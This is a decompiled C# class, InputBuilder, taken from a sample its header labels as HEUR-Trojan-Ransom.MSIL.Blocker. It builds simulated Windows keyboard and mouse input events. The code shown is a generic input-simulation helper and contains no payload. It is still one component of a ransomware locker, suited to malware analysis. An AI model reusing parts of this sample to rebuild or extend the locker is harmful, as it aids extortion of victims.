// Decompiled with JetBrains decompiler
// Type: VanillaStub.Helpers.Services.InputSimulator.InputBuilder
// Assembly: VanillaStub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: EA90E0E3-D3F0-4587-A40F-47A7FA59CCA7
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.06-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-b3851e5c28e260637f2bb0d27bd956234053f958c19d044c30c87ff4b731caac.exe

using System;
using System.Collections;
using System.Collections.Generic;
using VanillaStub.Helpers.Services.InputSimulator.Native;

namespace VanillaStub.Helpers.Services.InputSimulator
{
  internal class InputBuilder : IEnumerable<INPUT>, IEnumerable
  {
    private readonly List<INPUT> _inputList;

    public InputBuilder() => this._inputList = new List<INPUT>();

    public INPUT this[int position] => this._inputList[position];

    public IEnumerator<INPUT> GetEnumerator() => (IEnumerator<INPUT>) this._inputList.GetEnumerator();

    IEnumerator IEnumerable.GetEnumerator() => (IEnumerator) this.GetEnumerator();

    public INPUT[] ToArray() => this._inputList.ToArray();

    public static bool IsExtendedKey(VirtualKeyCode keyCode) => keyCode == VirtualKeyCode.MENU || keyCode == VirtualKeyCode.LMENU || keyCode == VirtualKeyCode.RMENU || keyCode == VirtualKeyCode.CONTROL || keyCode == VirtualKeyCode.RCONTROL || keyCode == VirtualKeyCode.INSERT || keyCode == VirtualKeyCode.DELETE || keyCode == VirtualKeyCode.HOME || keyCode == VirtualKeyCode.END || keyCode == VirtualKeyCode.PRIOR || keyCode == VirtualKeyCode.NEXT || keyCode == VirtualKeyCode.RIGHT || keyCode == VirtualKeyCode.UP || keyCode == VirtualKeyCode.LEFT || keyCode == VirtualKeyCode.DOWN || keyCode == VirtualKeyCode.NUMLOCK || keyCode == VirtualKeyCode.CANCEL || keyCode == VirtualKeyCode.SNAPSHOT || keyCode == VirtualKeyCode.DIVIDE;

    public InputBuilder AddKeyDown(VirtualKeyCode keyCode)
    {
      this._inputList.Add(new INPUT()
      {
        Type = 1U,
        Data = {
          Keyboard = new KEYBDINPUT()
          {
            KeyCode = (ushort) keyCode,
            Scan = (ushort) 0,
            Flags = InputBuilder.IsExtendedKey(keyCode) ? 1U : 0U,
            Time = 0U,
            ExtraInfo = IntPtr.Zero
          }
        }
      });
      return this;
    }

    public InputBuilder AddKeyUp(VirtualKeyCode keyCode)
    {
      this._inputList.Add(new INPUT()
      {
        Type = 1U,
        Data = {
          Keyboard = new KEYBDINPUT()
          {
            KeyCode = (ushort) keyCode,
            Scan = (ushort) 0,
            Flags = InputBuilder.IsExtendedKey(keyCode) ? 3U : 2U,
            Time = 0U,
            ExtraInfo = IntPtr.Zero
          }
        }
      });
      return this;
    }

    public InputBuilder AddKeyPress(VirtualKeyCode keyCode)
    {
      this.AddKeyDown(keyCode);
      this.AddKeyUp(keyCode);
      return this;
    }

    public InputBuilder AddCharacter(char character)
    {
      ushort num = (ushort) character;
      INPUT input1 = new INPUT()
      {
        Type = 1,
        Data = {
          Keyboard = new KEYBDINPUT()
          {
            KeyCode = 0,
            Scan = num,
            Flags = 4,
            Time = 0,
            ExtraInfo = IntPtr.Zero
          }
        }
      };
      INPUT input2 = new INPUT()
      {
        Type = 1,
        Data = {
          Keyboard = new KEYBDINPUT()
          {
            KeyCode = 0,
            Scan = num,
            Flags = 6,
            Time = 0,
            ExtraInfo = IntPtr.Zero
          }
        }
      };
      if (((int) num & 65280) == 57344)
      {
        input1.Data.Keyboard.Flags |= 1U;
        input2.Data.Keyboard.Flags |= 1U;
      }
      this._inputList.Add(input1);
      this._inputList.Add(input2);
      return this;
    }

    public InputBuilder AddCharacters(IEnumerable<char> characters)
    {
      foreach (char character in characters)
        this.AddCharacter(character);
      return this;
    }

    public InputBuilder AddCharacters(string characters) => this.AddCharacters((IEnumerable<char>) characters.ToCharArray());

    public InputBuilder AddRelativeMouseMovement(int x, int y)
    {
      INPUT input = new INPUT() { Type = 0 };
      input.Data.Mouse.Flags = 1U;
      input.Data.Mouse.X = x;
      input.Data.Mouse.Y = y;
      this._inputList.Add(input);
      return this;
    }

    public InputBuilder AddAbsoluteMouseMovement(int absoluteX, int absoluteY)
    {
      INPUT input = new INPUT() { Type = 0 };
      input.Data.Mouse.Flags = 32769U;
      input.Data.Mouse.X = absoluteX;
      input.Data.Mouse.Y = absoluteY;
      this._inputList.Add(input);
      return this;
    }

    public InputBuilder AddAbsoluteMouseMovementOnVirtualDesktop(
      int absoluteX,
      int absoluteY)
    {
      INPUT input = new INPUT() { Type = 0 };
      input.Data.Mouse.Flags = 49153U;
      input.Data.Mouse.X = absoluteX;
      input.Data.Mouse.Y = absoluteY;
      this._inputList.Add(input);
      return this;
    }

    public InputBuilder AddMouseButtonDown(MouseButton button)
    {
      INPUT input = new INPUT() { Type = 0 };
      input.Data.Mouse.Flags = (uint) InputBuilder.ToMouseButtonDownFlag(button);
      this._inputList.Add(input);
      return this;
    }

    public InputBuilder AddMouseXButtonDown(int xButtonId)
    {
      INPUT input = new INPUT() { Type = 0 };
      input.Data.Mouse.Flags = 128U;
      input.Data.Mouse.MouseData = (uint) xButtonId;
      this._inputList.Add(input);
      return this;
    }

    public InputBuilder AddMouseButtonUp(MouseButton button)
    {
      INPUT input = new INPUT() { Type = 0 };
      input.Data.Mouse.Flags = (uint) InputBuilder.ToMouseButtonUpFlag(button);
      this._inputList.Add(input);
      return this;
    }

    public InputBuilder AddMouseXButtonUp(int xButtonId)
    {
      INPUT input = new INPUT() { Type = 0 };
      input.Data.Mouse.Flags = 256U;
      input.Data.Mouse.MouseData = (uint) xButtonId;
      this._inputList.Add(input);
      return this;
    }

    public InputBuilder AddMouseButtonClick(MouseButton button) => this.AddMouseButtonDown(button).AddMouseButtonUp(button);

    public InputBuilder AddMouseXButtonClick(int xButtonId) => this.AddMouseXButtonDown(xButtonId).AddMouseXButtonUp(xButtonId);

    public InputBuilder AddMouseButtonDoubleClick(MouseButton button) => this.AddMouseButtonClick(button).AddMouseButtonClick(button);

    public InputBuilder AddMouseXButtonDoubleClick(int xButtonId) => this.AddMouseXButtonClick(xButtonId).AddMouseXButtonClick(xButtonId);

    public InputBuilder AddMouseVerticalWheelScroll(int scrollAmount)
    {
      INPUT input = new INPUT() { Type = 0 };
      input.Data.Mouse.Flags = 2048U;
      input.Data.Mouse.MouseData = (uint) scrollAmount;
      this._inputList.Add(input);
      return this;
    }

    public InputBuilder AddMouseHorizontalWheelScroll(int scrollAmount)
    {
      INPUT input = new INPUT() { Type = 0 };
      input.Data.Mouse.Flags = 4096U;
      input.Data.Mouse.MouseData = (uint) scrollAmount;
      this._inputList.Add(input);
      return this;
    }

    private static MouseFlag ToMouseButtonDownFlag(MouseButton button)
    {
      switch (button)
      {
        case MouseButton.LeftButton:
          return MouseFlag.LeftDown;
        case MouseButton.MiddleButton:
          return MouseFlag.MiddleDown;
        case MouseButton.RightButton:
          return MouseFlag.RightDown;
        default:
          return MouseFlag.LeftDown;
      }
    }

    private static MouseFlag ToMouseButtonUpFlag(MouseButton button)
    {
      switch (button)
      {
        case MouseButton.LeftButton:
          return MouseFlag.LeftUp;
        case MouseButton.MiddleButton:
          return MouseFlag.MiddleUp;
        case MouseButton.RightButton:
          return MouseFlag.RightUp;
        default:
          return MouseFlag.LeftUp;
      }
    }
  }
}
